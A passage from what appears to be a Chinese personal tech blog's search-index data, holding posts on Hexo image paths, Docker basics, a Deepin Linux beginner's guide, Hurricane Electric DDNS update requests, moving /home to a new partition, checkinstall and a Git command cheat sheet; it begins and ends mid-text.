语法和相对路径来引用图片和其它资源可能会导致它们在存档页或者主页上显示不正确。在Hexo 2时代，社区创建了很多插件来解决这个问题。但是，随着Hexo 3 的发布，许多新的标签插件被加入到了核心代码中。这使得你可以更简单地在文章中引用你的资源。\n\n```\n{% asset_path slug %}\n{% asset_img slug [title] %}\n{% asset_link slug [title] %}\n```\n\n比如说：当你打开文章资源文件夹功能后，你把一个 example.jpg 图片放在了你的资源文件夹中，如果通过使用相对路径的常规 markdown 语法 `![](example.jpg)` ，它将不会出现在首页上。（但是它会在文章中按你期待的方式工作）\n\n正确的引用图片方式是使用下列的标签插件而不是 markdown ：\n```\n{% asset_img example.jpg This is an example image %}\n```\n\n通过这种方式，图片将会同时出现在文章和主页以及归档页中。\n\n## Hexo使用Markdown语法引入图片\n\n`Hexo-render-marked 3.1.0`引入了一个新的使用Markdown语法引入图片，而不需要使用asset_img标签插件的方式。通过在_config.yml中配置：\n```yml\n# _config.yml\npost_asset_folder: true\nmarked:\n  prependRoot: true\n  postAsset: true\n```\n\n一旦启用，本地图片会被自动解析到其实际的路径下，如`image.jpg`位于`/2020/01/02/foo/image.jpg`下，表明它是文章`/2020/01/02/foo/`的图片，那么`![](image.jpg)`会被渲染成`<img src=\"/2020/01/02/foo/image.jpg\">`\n\n以上是Hexo官方文档的内容，本人在`_config.yml`中配置了\n\n```yml\nnew_post_name: \\[:year:month:day]:title.md # File name of new posts\n```\n经过验证，通过 `hexo new [layout] <title>`命令创建的文章时，会自动创建一个与markdown文件同名的文件夹用于存储图片，引用本地图片时，将图片存放在这个文件夹，只需通过`![](image.jpg)`引用即可。","tags":["Hexo"],"categories":["运维"]},{"title":"Docker新手入门","url":"/20210403/26d5932fd86e/","content":"\n## 1. Docker是什么？\n\nDocker 是一个开源的应用容器引擎，让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何主流操作系统上，也可以实现虚拟化。\n\n## 2. Docker解决什么问题？\n\n软件开发阶段在开发者的设备上往往开发环境都是完整的，甚至“多余”的，然而：\n\n- 在另一台机器（比如测试）上环境往往不同（软件、版本）\n- 在生产服务器需要最小限度的环境配置\n\nDocker可以在应用的层面上打包其所有的依赖并和操作系统实际的环境进行隔离，避免更改、污染操作系统本身的配置、文件或干扰其他进程。\n\n## 3. Docker与虚拟机？\n\nDocker容器不是模拟一个完整的操作系统，而是对进程进行隔离。或者说，在正常进程的外面套了一个保护层。对于容器里面的进程来说，它接触到的各种资源（文件系统、网络）都是虚拟的，从而实现与底层系统的隔离。\n\nDocker容器无需运行一个完整的操作系统，从而最大限度地降低对硬件资源的占用。\n\n![img](image-20200923085030183.png)\n\n## 4. Docker的安装与基本使用\n\n### 4.1 安装\n\nDocker安装请根据服务器操作系统选择相应的安装方法：\n\nhttps://docs.docker.com/engine/install/\n\n### 4.2 使用\n\n在我的个人服务器上曾今部署过为知笔记的私有服务端，服务端就是以docker镜像的方式提供的;\n\n[为知笔记官方部署教程](https://www.wiz.cn/zh-cn/docker)\n\n官方教程中将容器的80端口映射到了本地机器的80端口，但是本人服务器还部署了nginx服务器的3个站点，因此本人将本地的8080端口映射到容器的80端口，并在nginx中配置一个反向代理来访问该为知笔记的docker容器。\n\n### 4.3 子目录的反向代理\n\n为知笔记的docker镜像无法代理到某个域名的子目录下，需要独立的域名，可能其他应用可以支持，这里本人不是很清楚。以下是为知笔记的回复：\n\n![img](image-20200923090955672-1.png)\n\n## 5. Docker命令基础\n\n以下命令介绍均以Linux平台下，windows平台的docker应该也是差不多的。\n\n**注意：** docker在大多数情况下需要root或管理员权限，请适时增加sudo或以管理员身份打开命令行。\n\n- 从官方源中拉取镜像：\n\n```\ndocker image pull <image name>\n```\n\n- 查看本机镜像：\n\n```\ndocker image ls\n```\n\n- 运行一个镜像：\n\n```\ndocker container run <image name>\n```\n\n`docker container run`命令会从 image 文件，生成一个正在运行的容器实例。一个镜像相当于一个模板，可以创建运行多个容器。\n\n**注意:** `docker container run`命令如果发现本地没有指定的 image 文件，就会从仓库自动抓取。因此，前面的`docker image pull`命令并不是必需的步骤。\n\n- 查看正在运行的容器\n\n```\ndocker container ls\n```\n\n- 查看所有容器（含停止的容器）\n\n```\ndocker container ls -all\n```\n\n- 停止一个容器：\n\n一些容器会在运行结束后停止，但大多数不会，因为它们提供的是一项持续的服务。停止这些容器就需要：\n\n```\ndocker container kill <Container ID>\n```\n\n- 删除容器\n\n容器停止后还会保留容器文件，占据硬盘空间，如果需要可以将其删除\n\n```\ndocker container rm <Container ID>\n```\n\n## 6. 制作docker镜像\n\n本人由于是完全的业余折腾了下，还没到必须要制作一个docker的程度，我找了几个入门教程，希望对你有所帮助：\n\n#### 制作docker镜像\n\n- 请参考“**十、实例：制作自己的 Docker 容器**”：[Docker 入门教程](http://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html)\n- 较详细的dockerfile配置说明：[Docker Dockerfile](https://www.runoob.com/docker/docker-dockerfile.html)**注：**配置可以关注`COPY`,`CMD`,`ENTRYPOINT`,`ENV`,`VOLUME`,`EXPOSE`,`USER`命令配置\n\n### 微服务与docker compose\n\n对于一些较为大型或需要一定部署灵活性的需求，一般来说可以将语言环境如php，python和数据库等设施分开，分别运行在不同的docker容器中，教程可参考：\n\n- [Docker 微服务教程](http://www.ruanyifeng.com/blog/2018/02/docker-wordpress-tutorial.html)\n- [Docker Compose](https://www.runoob.com/docker/docker-compose.html)","tags":["入门教程","Linux","Docker"],"categories":["运维"]},{"title":"如何在 Windows 上查看 HEIC 格式照片","url":"/20200801/a7b980f2a11e/","content":"   \n\nwin10系统已经支持heic格式，应用商店下载即可：\n\n**下载**\n\n- [**HEIF/HEIC扩展库**](https://www.microsoft.com/en-us/p/heif-image-extensions/9pmmsr1cgpwg)\n- [**HEVC视频编解码库**](https://www.microsoft.com/en-us/p/hevc-video-extensions-from-device-manufacturer/9n4wgh0z6vhq)\n\nHEVC解码器在国区是收费的，7块钱，但是在美区是免费的，所以直接提供了一个美区的链接\n\n","tags":["Windows"],"categories":["日常"]},{"title":"手动升级WordPress","url":"/20200730/c5414a7081d2/","content":"  \n\n1. 备份Wordpress资料及数据库，强烈建议，为安全起见。\n2. 下载最新版的Wordpress，切记进入Wordpress官网下载。\n3. 删除主机上的wp-includes和wp-admin目录。\n4. 把解压在本地电脑的 WordPress 文件夹中除了wp-content目录外的所有文件都上传并覆盖到你博客主机相对应的位置。遇到是否覆盖时，选择全部覆盖就是了。\n5. 运行 `http://你的博客地址/wp-admin/upgrade.php`，执行升级","tags":["WordPress"],"categories":["运维"]},{"title":"Deepin 入门指南","url":"/20200605/a9d1c1bbb55d/","content":" \n\n## 1. 简介\n\n当前的大环境下，不少单位可能会面临无法通过正式渠道获得windows操作系统和相应支持的情况。一些单位或个人已经转向国产操作系统，比如ubuntu kylin（麒麟）、deepin（深度）等。比如华为笔记本提供了预装Linux的版本，预装的就是Deepin。Kylin、deepin、ubuntu等都是Debian系的Linux发行版（Debian也是一个Linux发行版本），在目前我的使用体验来说，和Ubuntu的体验没有什么大的区别，你可以使用Ubuntu的教程或者文档，但是深度提供了专门本地化的软件商店和桌面环境，还提供了一些Windows 软件的wine打包版本，使得新手能更方便的安装和使用。\n\n对Linux新手：请注意，所有Windows下的exe可执行程序，都不能在Linux平台下直接运行，部分程序可以使用wine模拟器来运行，但请注意，即便有wine模拟器，Linux下能运行的Windows程序依然不多。\n\n## 2. 适用人群\n\n最低能力配置：\n\n- 愿意尝试新东西\n- 有阅读文档并尝试解决问题的耐心和时间\n- 知道自己电脑的操作系统版本、了解32位/64位操作系统以及自己电脑的硬件是否兼容\n- Windows系统下熟练管理文件和软件\n\n推荐能力配置：\n\n- 对软件操作有较为抽象的步骤概念，可以使用不同界面的软件完成相似的任务（例如在WPS和MS Office间可无压力切换）\n- 英文文档阅读能力\n- 梯子\n- 基础cmd或powershell命令，如`cd`、`mkdir`、`ls`等\n\n当然如果你有Ubuntu或Debian或者其他发行版的使用经验，那么你**不需要**这个指南。\n\n## 3. 系统安装\n\nU盘安装系统与Windows基本无异：用[rufus](https://rufus.ie/)或其他U盘启动制作工具将iso镜像刻录到U盘中，然后重启，在BIOS中将第一启动项更改为U盘（或者相应的UEFI分区），开机按提示设置用户名、密码然后等待安装完成即可。详细安装教程可见[官方教程](https://www.deepin.org/installation/)\n\n注意：安装向导询问安装位置时，请不要自行分区和设置挂载点，直接选择全盘安装到一整块不小于40GB的硬盘中，后续我们再涉及磁盘管理的问题。\n\n## 4. 基本GUI界面使用\n\nGUI = Graphical User Interface，即图形用户交互界面，与之相对的是字符界面，只能输入命令执行任务。Deepin的UI界面与Windows有较大的差距，但是请不要慌，他们的基本操作逻辑大致相同：\n\n- 双击打开/右键菜单\n- 删除文件到回收站/从回收站恢复文件\n- 设置界面更接近手机的设置界面\n- ……\n\n事实上，Deepin的设置等界面其实更接近安卓或者iOS系统，UI界面的操作方法都是很简单的，当然右键菜单的内容比Windows上要少一些，其他的一些不好找的设置可以参考官方用户手册：https://wiki.deepin.org/\n\n## 5. 文件结构基本逻辑\n\n### 5.1 根目录的概念\n\n前面安装系统时安装向导会询问系统的安装位置，官方教程中提到了根目录：`/`。请注意，在操作系统中，目录=文件夹，请注意这一措辞的变化。\n\n与Windows的文件结构不同的是，无论你有多少硬盘、分了多少分区，所有的目录都在根目录下，我们在Windows下熟悉的诸如**C盘**，**D盘**等盘符的概念，在Linux操作系统中是不存在的，不同的分区和硬盘都是以目录（挂载点）的形式在文件系统中管理，例如：我们可以将C盘理解成 **根目录-C目录**：\n\n```\n/\n|\n+----C/\n|\n+----D/\n|\n+----E/\n|\n+----F/\n```\n\n### 5.2 家目录的概念\n\n家目录就是/home目录，系统会默认在这个目录下创建一个与用户名同名的目录，用于存放该用户的所有文件。目录结构如下：\n\n```\n/\n|\n+---- home/\n        |\n        +---<用户名>/\n            |\n            +---文档/\n            |\n            +---音乐/\n            |\n            +---图片/\n            |\n            +---下载/\n            |\n            +---视频/\n            |\n            +---……\n```\n\n请将所有的文件例如文档、照片、视频、软件安装包等内容分类放在你的目录下。默认情况下，新用户只有自己的家目录的写权限，其他文件最多只会有读权限（**请注意**：**删除**也是**写**操作）。\n\n### 5.3 root权限\n\n**注意：** *由于本文面向新手，所以会尽量少介绍命令，此处内容了解即可。*\n\nroot用户、用户组有系统最高的权限，可以无视任何文件权限配置读写文件系统下的任意一个文件或目录，那也就是说拥有“**一键删除一切**”的功能：\n\n![1](1.png)\n\n*（注意：Windows下的Administrator权限是用户能获得的最高权限，并不是系统的最高权限，不能和root类比）*\n\n在系统安装时添加的第一个用户会默认加入root用户组，直接执行命令时仅仅是以用户本身的权限执行。如果需要root权限，就在命令前加上sudo，然后会提示输入用户密码，以root用户的身份执行相应的命令。\n\n请注意，只有加入了root用户组的用户才能借用root权限。正是因为root权限几乎是“无可阻挡”，以root身份执行命令时请务必谨慎。\n\n文件的权限可以使用[chmod](https://man.linuxde.net/chmod)更改，大多数情况下，需要借用root权限，即使用`sudo chmod ...`\n\n## 6. 压缩文件与解压缩\n\n### 6.1 文件格式\n\n请注意，在Linux平台下源码包的打包压缩格式常常为`.tar.gz`，其他文件的压缩包多为`zip`格式。另外虽然Deepin也添加了7z、rar等格式的支持，请在打包压缩文件时尽量选择`zip`或`tar.gz`/`tar.bz2`格式\n\n### 6.2 压缩和解压缩\n\ndeepin的压缩和解压非常简单，与Windows相同，在压缩包上右键-压缩/解压，按提示选择保存位置即可。\n\n## 7. 软件的安装与卸载：\n\n如同在简介中提到的，你下载一个Windows的程序到Linux平台下会发现打不开/无法运行，Linux平台的软件包是通过与windows完全不同的方式安装的。请通过以下方式安装软件：\n\n### 7.1 软件商店\n\n第8节中的软件可以首先尝试在深度自带的应用商店中搜索，尝试安装前，请先到设置中更新软件信息，更新完成后才能正常安装，否则会报错。\n\n优先安装备注了Linux版的软件，而不是wine版本的，网页版最不推荐安装，有些软件是打包浏览器的网页版本， 没有备注，这种只能是下载后使用时才能发现。\n\n### 7.2 下载deb包\n\n并不是所有的软件都收录到了深度的软件商店中，另外一些软件需要我们自行下载安装包，请注意即便同样是Linux平台，不同格式的软件包也不是通用的，Debian系发行版的软件安装包都是`.deb`后缀，这也是最常见的一种格式，以网易云音乐为例：\n\n![img](2.png)\n\n其下载客户端的页面提供了Linux版本的下载，选择自己对应的发行版下载后，双击安装即可。无论是双击deb安装还是直接在软件商店内下载的软件都可以直接在已安装软件列表中一键卸载。\n\n### 7.3 apt/apt-get/dpkg命令\n\n**注意：** *7.3及后续的安装方法了解即可*\n\n上述通过商店安装软件实际上就是用过apt命令安装了对应的安装包，apt又是通过调用dpkg进行解包、安装，如果你需要安装一个名为smartmontools （硬盘检测）的软件包，那么，你只需要打开终端或者按下Ctrl+Alt+T调出终端，然后输入命令：\n\n> sudo apt install smartmontools -y\n\n回车，终端会提示输入密码，按要求输入你的密码然后回车后就会进行下载和安装。不过你能使用apt安装一个软件的前提是，软件开发者已经在apt的源仓库中已经提交了对应的软件包，和商店的其实是很相似的。\n\n卸载软件只需要运行：\n\n> sudo apt remove <软件包名> -y\n\n输入密码，回车确认即可。\n\n**那么我们能不能用命令安装自己下载的软件包呢？**答案是可以的。我们以网易云音乐（假设文件名为：`netease_music.deb`）为例，在官网下载了安装包后，打开到安装包所在的目录，然后右键-在终端中打开，然后输入\n\n> sudo apt install ./netease_music.deb -y\n\n回车，输入密码再回车即可安装\n\n当然，也可以使用`dpkg`命令进行安装：\n\n> sudo dpkg -i ./netease_music.deb -y\n\n那么`apt-get`又是什么命令呢？`apt-get`基本等同于`apt`命令，后者更新，我们应使用更新的版本。\n\n注意：由于商店和`apt`/`apt-get`命令都使用了`dpkg`命令，如果你正在安装或更新deb软件包，它就会被加锁，在其结束安装或更新前，你将不能再打开一个安装或更新过程。软件商店安装失败多半是因为系统在后台运行了一个更新过程，所以，安装失败的时候请先到设置里确认更新是否在运行中。\n\n### 7.4 脚本安装\n\n部分软件不能通过apt安装，也没有提供deb包，但是在下载页面提供了一个脚本，我们可以打开终端，直接复制粘贴脚本，回车即可安装，例如zerotier-one（虚拟局域网工具）：\n\n![img](3.png)\n\n注意：有一些通过脚本安装的软件可能不会提供卸载方法或者卸载方法比较复杂，这类软件的安装务必谨慎进行。另外脚本安装的可能是deb包软件，也可能不是，具体请阅读对应软件的安装说明。\n\n### 7.5 其他类型：snap，appimage\n\n- Snap：Snap是Canonical公司（Ubuntu的发行公司）的新一代包管理器，安全方便，部分软件会提供snap包，但它的权限管理比较复杂，初学者请不要尝试安装该类软件包。\n- appimage：部分软件在Linux平台会提供appimage，这种包将其需要的所有依赖软件全部打包在一起，因此通常来说体积会比较大，但是不需要担心任何依赖问题，基本可以做到在任何发行版中，双击即可运行，因此，在没有提供deb包时，可以优先选择appimage格式打包的软件，例如mkvtoolnix就在下载页面提供了appimage：\n\n![img](4.png)\n\n### 7.6 源码安装：\n\n有些软件提供源码包，需要自行编译安装。与一些脚本安装的软件类似，编译安装的软件往往依赖较多的外部软件包，需要手动安装，而且安装文件的步骤多，部分源码包不提供卸载方法，编译源码安装的软件同样不适合新手使用。\n\n如果你有了解`cd` `ls` `mkdir`这类基础命令，可以参考源码包内的安装方法（大多是英文），然后参考[本文](https://blog.sergget.ga/20200418/6a36829358ea/)安装源码包\n\n## 8. windows平台软件的替换\n\n靠前=更推荐，深度提供了部分工具：录屏、截图、分区工具\n\n1. 输入法：搜狗（预装）、Sunpinyin\n2. 浏览器：chrome（预装）、firefox\n3. Office三件套: WPS（预装）（Ubuntu下默认安装的字体和Windows下有很多不同，请自行搜索下载需要的字体）\n4. 邮件客户端：Evolution、Thunderbird（预装）\n5. pdf阅读器：福昕阅读器Linux版、Okular、金山PDF（预装）\n6. 流程图/Visio替代：Dia\n7. 下载：qbittorrent、uget、百度网盘Linux版\n8. 笔记：Evernote(使用第三方linux客户端Nixnote)、为知笔记（会员或[自行部署服务端](https://www.wiz.cn/zh-cn/enterprise-private-cloud.html)）、simplenote\n9. 网页剪辑：pocket扩展+手机端应用\n10. 视频相关：\n    - 播放器：VLC、kodi\n    - 剪辑：kdenlive、shocut\n    - 字幕编辑：subtitle editor\n    - mkv打包和拆包：mkvtoolnix\n    - 视频转码：HandBrake\n    - 录屏：kazam\n    - 3D动画：Blender\n11. 音乐播放器：网易云音乐、VLC、Spotify\n12. 图片和照片：\n    - 相册：shotwell、digikam\n    - PS替代：GIMP\n    - 矢量图：InkScape\n13. CAD：中望CAD Linux版、freeCAD\n14. 虚拟局域网：zerotier-one\n15. 虚拟机：Virtualbox\n16. 梯子：Github上搜索你使用的协议名称+Linux即可，有UI的更好。不要问推荐什么，咱不知道。\n\n## 9. 磁盘分区和管理：\n\n如果你没有在Windows下使用过系统自带分区工具、diskgenius或其他的分区工具，请忽略本节内容，相关需求请联系专业人员处理。\n\n### 9.1 GUI工具：disks\n\nDeepin下使用系统自带的分区工具或者下载disks工具即可，操作其他的分区工具类似。\n\nLinux下常用的文件系统为`ext3`, `ext4`，不能直接使用Windows常见的NTFS文件系统，对于一些小文件需要在Windows和Linux之间频繁切换的U盘可以格式化成`FAT32`格式，这种文件系统在两个平台上都能直接使用，代价是不能存储单个大于4G的文件。\n\n如果一定要使用NTFS文件系统，可以使用如下命令安装软件包：\n\n> sudo apt install ntfs-3g -y\n\n即可挂载NTFS分区\n\n### 9.2 命令行：parted/fdisk+mkfs\n\nLinux平台下更多的使用命令行来对硬盘进行分区和格式化，常用的分区命令：parted、fdisk，格式化工具：mkfs（make file system）\n\n关于这些命令的使用，可以阅读：\n\n- parted命令：https://man.linuxde.net/parted\n- fdisk命令：http://man.linuxde.net/fdisk\n- mkfs命令：https://man.linuxde.net/mkfs\n\n请注意：parted用于gpt分区，fdisk用于mbr分区\n\n### 9.3 挂载点的概念\n\n挂载点是Linux平台与Windows平台对存储资源管理的最大不同点之一，由于Linux平台文件系统始终以根目录作为最初始的目录，如果我们需要使用硬盘的某一个分区，就只能把它作为一个目录添加到Linux的文件系统中，代表这个分区的目录就被我们称作挂载点，为硬盘分区分配一个目录的动作就被称为挂载。\n\n我们存储在挂载点这个目录的所有文件，在物理上就存储在其对应的硬盘分区中。\n\n分区的挂载操作和卸载操作：\n\n- 挂载分区：https://man.linuxde.net/mount\n- 卸载分区：https://man.linuxde.net/umount\n\n**注意**：使用mount命令挂载的分区会在重启后消失，如需要开机就自动挂载，请阅读：https://www.cnblogs.com/qiyebao/p/4484047.html\n\n如果你新增加了一块硬盘，需要将你的家目录转移到该硬盘上，可以参考：https://sergget.ga/20200426/0cad07e5443e/\n\n## 10. 小结\n\n由于Linux教程大多是开篇介绍命令，对于桌面用户非常不友好，所以本文致力于介绍其逻辑，但是即便deepin做了很多本地化和图形化的工作，作为一个Linux系统仍然有很多地方不得不使用命令行/字符界面，作为桌面用户仍然需要适时地学习相关的命令。网上有很多Linux教程，可以参考视频教程：https://www.imooc.com/course/programdetail/pid/45 选择性地学习。\n\n最后请善用搜索引擎（推荐必应，国内搜索引擎真是一言难尽）！\n\n## 11. 题外话\n\n从第8节的可以看出，Deepin可以完成不少的基础和进阶任务，但一些特定的专业软件没有Linux平台的版本，即便有，也有很大概率是英文版，不适合在从事这一类活动的企业中大面积推广。这决定了它目前只能在一些政府单位等行业等文书类工作比较集中的地方，至于这些人能不能/愿不愿意学这个东西就是另外一回事了。\n\n要说另一个好处就是适合仅限于“查资料/学习用途”的学生了，毕竟Linux平台下游戏少得可怜，质量还不好，即便是Steam平台有Linux版本，上面也有一些游戏，作为家长只要管控住银行卡，孩子们基本就没有什么游戏的空间。毕竟总不会有谁扫雷玩儿一天吧？不会吧？不会吧？","tags":["入门教程","Deepin"],"categories":["日常"]},{"title":"HE DDNS服务文档","url":"/20200426/fc0f4387da81/","content":"\n原文链接：https://dns.he.net/docs.html\n\n本人对文档的python实现：https://github.com/Sergget/Tools/01_DDNS-HE\n\n以下为原文：\n\n## Getting started\n\nOur dynamic DNS service will allow you to update the IPv4 and IPv6 address of your A and AAAA records of domains that you manage using dns.he.net through the use of a simple web request or using any dyndns compatible client. We do not currently charge for this service. it is included for free with your dns.he.net account.\n\n## Basic Configuration\n\nTo use the dynamic DNS feature, you will first need to create a domain or subdomain (the zone) that you want to use with the dynamic DNS service. Once you have created the zone, you will want to create an ‘A’ and/or a ‘AAAA’ record. If you wish to use the dynamic service with the primary domain, leave the ‘Name’ box empty otherwise enter the subdomain name. (ie for the subdomain of example.com “house.example.com”, you would simply enter “house”.) Now click on the ‘enable entry for dynamic dns’ checkbox. The address field will be auto populated with your current address or the localhost address for the record type (for an ‘A’ record that would be 127.0.0.1. For a ‘AAAA’ record, this would be ::1 ) and the TTL will automatically be set to 300 (5 minutes). Submit then entry. You have just enabled a record to be dynamic.\n\nNote: The dynamic DNS update server uses the name of the record to determine what to update. Having more that one ‘A’ record or more than one ‘AAAA’ record will not have the desired effect.\n\nYou will be returned to the Edit Zone page. Dynamic records will be denoted with a pale blue row background as well as the icon (generate). Click on the icon to generate the password that will be used for dynamic DNS update client. As of this writing, you only need to generate one key per domain name (only one is necessary for both the ‘A’ and ‘AAAA’ records). Generating multiple passwords for a given domain name will likely not have the desired effect.\n\nNote: This behavior may change in the future as we make additional changes to the interface.\n\n## Basic Use\n\nUpdate requests can be sent over http or https. The site is currently using a self signed certificate that was generated by our security team.\n\n The most basic example:\n\n```\n https://[your domain name]:[your password]@dyn.dns.he.net/nic/update?hostname=[your domain name]\n```\n\n###  **Autodetect my IPv4/IPv6 address:**\n\n```\n% curl -4 \"https://dyn.example.com:password@dyn.dns.he.net/nic/update?hostname=dyn.example.com\"                                        \n% curl -6 \"https://dyn.example.com:password@dyn.dns.he.net/nic/update?hostname=dyn.example.com\"                                        \n```\n\n### **Specify my IPv4/IPv6 address:**\n\n```\n% curl \"https://dyn.example.com:password@dyn.dns.he.net/nic/update?hostname=dyn.example.com&myip=192.168.0.1\"\n% curl \"https://dyn.example.com:password@dyn.dns.he.net/nic/update?hostname=dyn.example.com&myip=2001:db8:beef:cafe::1\"\n```\n\n### **Authentication and Updating using GET**\n\nNote: The username is also the hostname. The password is sent using ‘password=’. This skips HTTP basic auth.\n\n```\n% curl \"https://dyn.dns.he.net/nic/update?hostname=dyn.example.com&password=password&myip=192.168.0.1\"\n% curl \"https://dyn.dns.he.net/nic/update?hostname=dyn.example.com&password=password&myip=2001:db8:beef:cafe::1\"\n```\n\n### **Authentication and Updating using a POST**\n\n```\n% curl \"https://dyn.dns.he.net/nic/update\" -d \"hostname=dyn.example.com\" -d \"password=password\" -d \"myip=192.168.0.1\"\n% curl \"https://dyn.dns.he.net/nic/update\" -d \"hostname=dyn.example.com\" -d \"password=password\" -d \"myip=2001:db8:beef:cafe::1\"\n```\n\n## Things to note about the dynamic DNS service\n\nYour “username” is going to be the name of the record that has been tagged dynamic. ie You marked the A record for dyn.example.com as dynamic. Your username will be “dyn.example.com” You can tag an A or AAAA record by editing it once you have selected the zone. (check the box). Once you have “activated” the record to be dynamic, you will need to generate a key (or password if you prefer) for it. (click on the generate icon) to generate the key for the dynamic record. If you have tagged both an A and AAAA record to be dynamic, you will see the icon twice, it is only necessary to generate one key as it is bound to the name of the record and not the name/type. When making updates, you will need to make a separate update for ipv4 and ipv6.\n\nNote:We may add an additional “myipv6=” option in the future.","tags":["DDNS","Hurricane Electric"],"categories":["运维"]},{"title":"将/home目录迁移到另一个分区","url":"/20200426/0cad07e5443e/","content":"   \n\n基本思路：\n\n```\n准备好新的分区 => 暂时挂载到中间挂载点 => 拷贝文件到中间挂载点 => 将新分区挂载到/home目录下\n```\n\n## 准备新分区\n\n使用fdisk工具进行分区：\n\n```\nsudo fdisk -l     #查看可用的设备\nsudo fdisk /dev/sdc    #开始分区，具体命令在工具内输入m获得帮助，分区完成后使用命令w保存退出\n```\n\n格式化分区\n\n```\nmkfs.ext4 /dev/sdc1/\n```\n\n## 暂时挂载到中间挂载点\n\n```\nmount /dev/sdc1 /media/home\n```\n\n## 拷贝文件到中间挂载点\n\n注意，我们需要确保在/home目录中不再写入新的信息，实现方法有两种：\n\n1. 查看正在使用/home目录的用户和进程，如果有就用wall命令通知用户保存文件并退出（或使用强硬手段：`fuser -km /home`—-直接将运行在/home的所有进程关闭）\n2. 进入单用户模式 `init 1`，**注意**：该模式没有网络链接，需要在实机上直接操作。\n\n任意选择一种方法后：\n\n```\ncp -a /home/* /media/home\n```\n\n## 将新分区挂载到/home目录下\n\n编辑`/etc/fstab`文件，并写入挂载信息：\n\n```\nsudo vim /etc/fstab\n# 写入挂载信息\n# <file system> <mount point> <type> <options> <dump> <pass>\n/dev/sdc1 /home ext4 defaults 0 0\n```\n\n保存退出后运行`sudo mount -a`使得配置生效","tags":["Ubuntu"],"categories":["运维"]},{"title":"将源码包编译成Deb包 – Checkinstall","url":"/20200418/6a36829358ea/","content":"  \n\n**翻译自：** https://help.ubuntu.com/community/CheckInstall\n\n## 1.简介\n\n`CheckInstall` 跟踪由`make install`或类似命令生成安装的所有文件，并创建`Slackware`, `RPM`或`Debian`包，将其添加到包的数据库，可以方便地卸载或分发软件包。\n\n使用`CheckInstall`来替代`sudo make install`，由于后者可能将文件安装到文件系统的各种位置，导致在出现问题的情况下卸载困难。而且如果将来你安装的某个软件包中的某些文件和你现在编译安装的某些文件相同，则会导致你编译安装的软件出错甚至停止工作。\n\n（实际上，不仅仅是`make install`，`CheckInstall`能跟踪任何命令所修改的文件，这是得它能够用于`apt`以外的的任何类型的软件包的安装，并使用包管理器跟踪其安装过程。）\n\n`CheckInstall`不适合用于生成用于发行目的的软件包。不要使用该软件来为Ubuntu archive或PPA源的软件打包。请遵循相应的打包方法。\n\nCheckInstall 的README文件：”CheckInstall对Debian的支持尚未稳定，请小心使用。对于某些Debian系的操作系统，用户反馈该软件包工作正常，当然它在我的已安装了dpkg的Slackware开发环境下表现良好，但是在你的环境里可能各有不同。”\n\n## 2.安装\n\n执行以下命令从软件仓库进行安装：\n\n```\nsudo apt-get update && sudo apt-get install checkinstall\n```\n\n## 3.使用\n\n编译安装时，不再使用：\n\n```\nsudo make install\n```\n\n而是：\n\n```\nsudo checkinstall\n```\n\n执行命令时不带任何参数，`checkinstall`则会默认调用`make install`。如果你需要使用其他参数，则可以这样使用：\n\n```\nsudo checkinstall make install_package\n```\n\n安装的包可以非常轻松地使用Synaptic或终端来删除：\n\n```\nsudo dpkg -r packagename\n```\n\n例如：\n\n```\nsudo dpkg -r pidgin\n```\n\n**注意：** 生成的`.deb`包也可以在其他地方使用，极大地简化了同一软件包在大量机器上的安装过程。\n\n## 4. 配合auto-apt使用checkinstall\n\n你也可以使用`auto-apt`与`checkinstall`配合，从源代码创建一个简单的软件包（需要安装`auto-apt`）：\n\n不再使用：\n\n```\n./configure\n```\n\n请使用:\n\n```\nauto-apt run ./configure\n```\n\n如果依赖都可用，一个对话框会被打开，并要求你安装它们，剩下的则保持不变：\n\n```\nmake\nsudo checkinstall\nRelated Links\nCategorySoftware CategoryCommandLine\n```","tags":["Ubuntu","apt"],"categories":["运维"]},{"title":"常用 Git 命令清单","url":"/20200418/41df35210044/","content":"    \n\n***本文转载自阮一峰的《[常用Git命令清单](http://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html)》\\***\n\n我每天使用 Git ，但是很多命令记不住。\n\n一般来说，日常使用只要记住下图6个命令，就可以了。但是熟练使用，恐怕要记住60～100个命令。\n\n![img](bg2015120901.png)\n\n下面是我整理的常用 Git 命令清单。几个专用名词的译名如下。\n\n- Workspace：工作区\n- Index / Stage：暂存区\n- Repository：仓库区（或本地仓库）\n- Remote：远程仓库\n\n## 一、新建代码库\n\n```\n# 在当前目录新建一个Git代码库\n$ git init\n\n# 新建一个目录，将其初始化为Git代码库\n$ git init [project-name]\n\n# 下载一个项目和它的整个代码历史\n$ git clone [url]\n```\n\n## 二、配置\n\nGit的设置文件为`.gitconfig`，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。\n\n```\n# 显示当前的Git配置\n$ git config --list\n\n# 编辑Git配置文件\n$ git config -e [--global]\n\n# 设置提交代码时的用户信息\n$ git config [--global] user.name \"[name]\"\n$ git config [--global] user.email \"[email address]\"\n```\n\n## 三、增加/删除文件\n\n```\n# 添加指定文件到暂存区\n$ git add [file1] [file2] ...\n\n# 添加指定目录到暂存区，包括子目录\n$ git add [dir]\n\n# 添加当前目录的所有文件到暂存区\n$ git add .\n\n# 添加每个变化前，都会要求确认\n# 对于同一个文件的多处变化，可以实现分次提交\n$ git add -p\n\n# 删除工作区文件，并且将这次删除放入暂存区\n$ git rm [file1] [file2] ...\n\n# 停止追踪指定文件，但该文件会保留在工作区\n$ git rm --cached [file]\n\n# 改名文件，并且将这个改名放入暂存区\n$ git mv [file-original] [file-renamed]\n```\n\n## 四、代码提交\n\n```\n# 提交暂存区到仓库区\n$ git commit -m [message]\n\n# 提交暂存区的指定文件到仓库区\n$ git commit [file1] [file2] ... -m [message]\n\n# 提交工作区自上次commit之后的变化，直接到仓库区\n$ git commit -a\n\n# 提交时显示所有diff信息\n$ git commit -v\n\n# 使用一次新的commit，替代上一次提交\n# 如果代码没有任何新变化，则用来改写上一次commit的提交信息\n$ git commit --amend -m [message]\n\n# 重做上一次commit，并包括指定文件的新变化\n$ git commit --amend [file1] [file2] ...\n```\n\n## 五、分支\n\n```\n# 列出所有本地分支\n$ git branch\n\n# 列出所有远程分支\n$ git branch -r\n\n# 列出所有本地分支和远程分支\n$ git branch -a\n\n# 新建一个分支，但依然停留在当前分支\n$ git branch [branch-name]\n\n# 新建一个分支，并切换到该分支\n$ git checkout -b [branch]\n\n# 新建一个分支，指向指定commit\n$ git branch [branch] [commit]\n\n# 新建一个分支，与指定的远程分支建立追踪关系\n$ git branch --track 